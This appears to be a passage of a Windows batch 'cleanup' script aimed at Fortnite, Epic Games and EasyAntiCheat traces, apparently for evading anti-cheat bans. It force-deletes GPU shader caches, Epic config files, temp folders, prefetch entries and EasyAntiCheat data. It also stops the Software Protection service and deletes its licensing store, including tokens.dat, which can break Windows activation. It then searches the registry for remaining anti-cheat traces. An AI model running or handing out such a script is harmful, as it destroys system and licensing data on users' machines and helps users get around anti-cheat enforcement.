if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.1.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.1.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.2.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.2.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.2.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_1.2.toc"
if exist "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\BaseHardware.ini" del /f /q "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\BaseHardware.ini"
if exist "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\Base.ini" del /f /q "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\Base.ini"
if exist "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\BaseGame.ini" del /f /q "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\BaseGame.ini"
if exist "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\BaseInput.ini" del /f /q "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\BaseInput.ini"
if exist "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\Windows\WindowsGame.ini" del /f /q "C:\Program Files (x86)\Epic Games\Launcher\Engine\Config\Windows\WindowsGame.ini"
cmd /C net stop sppsvc
cmd /C del "%windir%\system32\spp\store\2.0\cache\cache.dat"
cmd /C del "%windir%\system32\spp\store\2.0\data.dat"
cmd /C del "%windir%\system32\spp\store\2.0\tokens.dat"
cmd /C net start sppsvc
cmd /C rmdir /s /q "%systemdrive%\Users\%username%\AppData\Local\Temp"
echo [*] Deleting Hidden Logs...
del /s /q "%PROGRAMDATA%\EasyAntiCheat" >nul 2>&1
del /s /q "%LOCALAPPDATA%\Temp" >nul 2>&1
del /s /q "C:\Windows\Prefetch\EasyAntiCheat" >nul 2>&1
echo [*] Scanning for remaining traces...
reg query HKCU /f "Epic" /s
reg query HKLM /f "Epic" /s
reg query HKCU /f "Fortnite" /s
reg query HKLM /f "Fortnite" /s
reg query HKLM /f "EasyAntiCheat" /s
reg query HKLM /f "BEService" /s
:: Final Reboot to Apply Changes
echo [!] CLEANUP COMPLETE. Restart PC Before DOING ANYTHING!!!
timeout /t 10
